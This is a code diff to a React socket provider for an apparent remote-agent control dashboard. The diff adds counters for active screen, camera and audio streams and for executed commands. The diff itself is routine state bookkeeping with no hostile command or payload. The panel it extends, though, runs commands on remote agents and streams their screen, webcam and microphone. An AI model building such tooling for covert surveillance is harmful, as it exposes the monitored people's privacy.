@@ -52,6 +52,8 @@ interface SocketContextType {
   login: (password: string, otp?: string) => Promise<{ success?: boolean; data?: any; error?: string }>;
   logout: () => Promise<void>;
   agentMetrics: Record<string, { cpu: number; memory: number; network: number }>;
+  streamsActiveCount: number;
+  commandsExecutedCount: number;
   agentConfig: Record<string, {
     agent?: {
       id?: string;
@@ -183,6 +185,9 @@ export function SocketProvider({ children }: { children: React.ReactNode }) {
   const [selectedAgent, setSelectedAgent] = useState<string | null>(null);
   const [commandOutput, setCommandOutput] = useState<string[]>([]);
   const [agentMetrics, setAgentMetrics] = useState<Record<string, { cpu: number; memory: number; network: number }>>({});
+  const streamsActiveRef = useRef<Record<string, number>>({});
+  const [streamsActiveCount, setStreamsActiveCount] = useState<number>(0);
+  const [commandsExecutedCount, setCommandsExecutedCount] = useState<number>(0);
   const lastEmitRef = useRef<Record<string, number>>({});
   const [lastActivity, _setLastActivity] = useState<{ type: string; details?: string; agentId?: string | null; timestamp?: number }>(() => {
     try {
@@ -254,6 +259,29 @@ export function SocketProvider({ children }: { children: React.ReactNode }) {
     try { localStorage.setItem(key, path || '/'); } catch {}
     setLastActivity('files', path || '/', agentId || null);
   }, [setLastActivity]);
+
+  const markStreamActive = useCallback((agentId: string) => {
+    if (!agentId) return;
+    streamsActiveRef.current[agentId] = Date.now();
+    const now = Date.now();
+    const count = Object.values(streamsActiveRef.current).filter(ts => now - ts < 15000).length;
+    setStreamsActiveCount(count);
+  }, []);
+
+  useEffect(() => {
+    const t = window.setInterval(() => {
+      try {
+        const now = Date.now();
+        const next: Record<string, number> = {};
+        for (const [k, v] of Object.entries(streamsActiveRef.current)) {
+          if (now - v < 15000) next[k] = v;
+        }
+        streamsActiveRef.current = next;
+        setStreamsActiveCount(Object.keys(next).length);
+      } catch {}
+    }, 3000);
+    return () => window.clearInterval(t);
+  }, []);
 
   useEffect(() => {
     // Connect to Socket.IO server
@@ -474,6 +502,7 @@ export function SocketProvider({ children }: { children: React.ReactNode }) {
           : (typeof data.output === 'string' ? data.output : '');
       if (typeof text === 'string') {
         addCommandOutput(agentTag + text);
+        setCommandsExecutedCount(prev => prev + 1);
       }
     });
 
@@ -505,6 +534,7 @@ export function SocketProvider({ children }: { children: React.ReactNode }) {
     // Streaming events
     socketInstance.on('screen_frame', (data: { agent_id: string; frame: any }) => {
       console.log('📹 SocketProvider: Received screen_frame from agent:', data.agent_id);
+      try { markStreamActive(String(data.agent_id || '')); } catch {}
       try {
         const f = data?.frame as any;
         if (typeof f !== 'string' && f) {
@@ -520,6 +550,7 @@ export function SocketProvider({ children }: { children: React.ReactNode }) {
 
     socketInstance.on('camera_frame', (data: { agent_id: string; frame: any }) => {
       console.log('📷 SocketProvider: Received camera_frame from agent:', data.agent_id);
+      try { markStreamActive(String(data.agent_id || '')); } catch {}
       try {
         const f = data?.frame as any;
         if (typeof f !== 'string' && f) {
@@ -535,6 +566,7 @@ export function SocketProvider({ children }: { children: React.ReactNode }) {
 
     socketInstance.on('audio_frame', (data: { agent_id: string; frame: any }) => {
       console.log('🎤 SocketProvider: Received audio_frame from agent:', data.agent_id);
+      try { markStreamActive(String(data.agent_id || '')); } catch {}
       try {
         const f = data?.frame as any;
         if (typeof f !== 'string' && f) {
@@ -957,7 +989,7 @@ export function SocketProvider({ children }: { children: React.ReactNode }) {
       console.error('🔍 SocketProvider: Error sending command:', error);
       addCommandOutput(`Error: Failed to send command`);
     }
-  }, [socket, connected, addCommandOutput]);
+  }, [socket, connected, addCommandOutput, setLastActivity, markStreamActive]);
 
   const startStream = useCallback((agentId: string, type: 'screen' | 'camera' | 'audio') => {
     if (socket && connected) {
@@ -983,6 +1015,7 @@ export function SocketProvider({ children }: { children: React.ReactNode }) {
       socket.emit('execute_command', { agent_id: agentId, command });
       addCommandOutput(`Starting ${type} stream for ${agentId}`);
       setLastActivity(`stream:${type}`, `started`, agentId);
+      markStreamActive(agentId);
       try {
         const key = `stream:last:${agentId}`;
         const raw = localStorage.getItem(key);
@@ -990,7 +1023,7 @@ export function SocketProvider({ children }: { children: React.ReactNode }) {
         localStorage.setItem(key, JSON.stringify({ ...prev, [type]: true }));
       } catch {}
     }
-  }, [socket, connected, addCommandOutput]);
+  }, [socket, connected, addCommandOutput, setLastActivity]);
 
   const stopStream = useCallback((agentId: string, type: 'screen' | 'camera' | 'audio') => {
     if (socket && connected) {
@@ -1016,6 +1049,12 @@ export function SocketProvider({ children }: { children: React.ReactNode }) {
       socket.emit('execute_command', { agent_id: agentId, command });
       addCommandOutput(`Stopping ${type} stream for ${agentId}`);
       setLastActivity(`stream:${type}`, `stopped`, agentId);
+      try {
+        delete streamsActiveRef.current[agentId];
+        const nowTs = Date.now();
+        const count = Object.values(streamsActiveRef.current).filter(ts => nowTs - ts < 15000).length;
+        setStreamsActiveCount(count);
+      } catch {}
       try {
         const key = `stream:last:${agentId}`;
         const raw = localStorage.getItem(key);
@@ -1183,6 +1222,8 @@ export function SocketProvider({ children }: { children: React.ReactNode }) {
     login,
     logout,
     agentMetrics,
+    streamsActiveCount,
+    commandsExecutedCount,
     agentConfig,
     notifications,
     requestSystemInfo,
